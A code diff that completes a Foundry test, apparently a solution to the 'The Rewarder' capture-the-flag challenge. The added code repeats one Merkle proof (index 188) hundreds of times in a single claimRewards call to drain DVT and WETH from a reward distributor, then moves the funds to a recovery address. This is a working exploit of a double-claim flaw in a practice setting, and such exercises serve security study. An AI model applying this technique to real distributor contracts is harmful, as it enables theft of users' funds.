@@ -148,7 +148,41 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // dvt ind 188
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint limitDVT = 867;
+        uint limitWETH = 853;
+        Claim[] memory claims = new Claim[](limitDVT);
+        IERC20[] memory tokensToClaim = new IERC20[](limitDVT);
+
+        for(uint i = 0; i < limitDVT; i++){
+            claims[i] = Claim({
+                batchNumber: 0, 
+                amount: 11524763827831882,
+                tokenIndex: 0, 
+                proof: merkle.getProof(dvtLeaves, 188) 
+            });
+            tokensToClaim[i] = IERC20(address(dvt));
+        }
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+
+        Claim[] memory claims2 = new Claim[](limitWETH);
+        IERC20[] memory tokensToClaim2 = new IERC20[](limitWETH);
+        for(uint i = 0; i < limitWETH; i++){
+            claims2[i] = Claim({
+                batchNumber: 0, 
+                amount: 1171088749244340,
+                tokenIndex: 1, 
+                proof: merkle.getProof(wethLeaves, 188)
+            });
+            tokensToClaim2[i] = IERC20(address(weth));
+        }
+        distributor.claimRewards({inputClaims: claims2, inputTokens: tokensToClaim2});
+        weth.transfer(recovery, weth.balanceOf(player));
+        dvt.transfer(recovery, dvt.balanceOf(player));
     }
 
     /**
